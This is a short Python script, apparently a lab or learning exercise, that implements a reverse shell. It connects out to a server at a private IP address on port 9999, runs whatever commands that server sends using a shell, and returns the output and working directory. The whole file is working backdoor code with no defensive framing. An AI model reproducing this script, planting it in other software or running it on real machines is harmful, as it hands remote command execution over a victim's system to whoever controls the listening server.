import os #Operating System
import socket
import subprocess

s = socket.socket()
host = '10.0.2.15' #IP Address of server over which TCP|Connection is been Established
port = 9999

s.connect((host,port))

while True:
    data =  s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() #send out to server
        output_str = str(output_byte, "utf-8") #Storing Output from output_byte
        currentWD = os.getcwd() + "> \t"  #Gets the Current working Directory
        #s.send(str.encode(currentWD))
        s.send(str.encode(output_str + currentWD))

        print(output_str)
